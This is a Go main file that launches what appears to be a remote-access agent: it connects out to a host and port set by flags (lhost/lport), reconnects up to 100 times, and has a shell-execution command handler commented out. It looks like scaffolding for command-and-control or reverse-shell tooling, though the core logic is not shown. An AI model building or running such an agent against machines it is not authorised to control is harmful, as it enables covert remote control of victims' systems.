package main

import (
	"flag"
	"fmt"
	"os"
	"os/signal"

	"konstantinovitz.com/kuang/internal/agent"
	"konstantinovitz.com/kuang/internal/utils"
)

func main() {
	// Define command-line flags
	lhost := flag.String("lhost", "0.0.0.0", "The local host IP address")
	lport := flag.String("lport", "9000", "The local port to connect to")

	// Parse the flags
	flag.Parse()

	// Use the flag values
	fmt.Printf("Starting agent on %s:%s\n", *lhost, *lport)

	// Create and start the agent with the specified lhost and lport
	agentTransport := &agent.TCPTransport{
		LHOST: *lhost,
		LPORT: *lport,
	}

	commandManager := utils.NewCommandManager()
	// commandManager.RegisterHandler("ping", handlePing)
	// commandManager.RegisterDefaultHandler(handleShellExec)

	agent := &agent.Agent{
		Transport:      agentTransport,
		MaxRetries:     100,
		BaseDelay:      1,
		CommandManager: *commandManager,
	}

	go func() {
		err := agent.Start()
		if err != nil {
			panic(err)
		}
	}()

	// Catch OS signals to gracefully shut down
	sigs := make(chan os.Signal, 1)
	signal.Notify(sigs, os.Interrupt)

	<-sigs
	agent.Stop()
	fmt.Println("Agent stopped")
}
